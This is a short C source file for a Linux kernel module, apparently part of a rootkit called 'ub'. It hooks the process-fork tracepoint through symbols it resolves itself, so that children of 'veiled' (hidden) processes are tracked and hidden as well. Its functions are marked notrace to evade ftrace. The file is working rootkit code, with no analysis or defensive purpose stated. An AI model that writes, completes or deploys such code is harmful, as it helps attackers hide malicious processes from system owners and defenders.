#include "../include/ub_core.h"
#include "../include/trace.h"
#include "../include/veiled_pids.h"
#include "../ftrace/hook_engine.h"

static struct tracepoint *tp_sched_fork;
static int (*_probe_register)(struct tracepoint *, void *, void *);
static int (*_probe_unregister)(struct tracepoint *, void *, void *);

notrace static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
{
    if (ub_is_veiled(parent->pid) || ub_is_veiled(parent->tgid) ||
        ub_is_offspring(parent->pid) || ub_is_offspring(parent->tgid)) {
        ub_offspring_track(child->pid);
        ub_offspring_track(child->tgid);
    }
}

notrace int ub_traceguard_start(void)
{
    _probe_register = (void *)ub_resolve_symbol("tracepoint_probe_register");
    _probe_unregister = (void *)ub_resolve_symbol("tracepoint_probe_unregister");
    tp_sched_fork = (void *)ub_resolve_symbol("__tracepoint_sched_process_fork");

    if (tp_sched_fork && _probe_register)
        _probe_register(tp_sched_fork, on_fork_handler, NULL);

    return 0;
}
EXPORT_SYMBOL(ub_traceguard_start);

notrace void ub_traceguard_stop(void)
{
    if (tp_sched_fork && _probe_unregister)
        _probe_unregister(tp_sched_fork, on_fork_handler, NULL);
}
EXPORT_SYMBOL(ub_traceguard_stop);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");
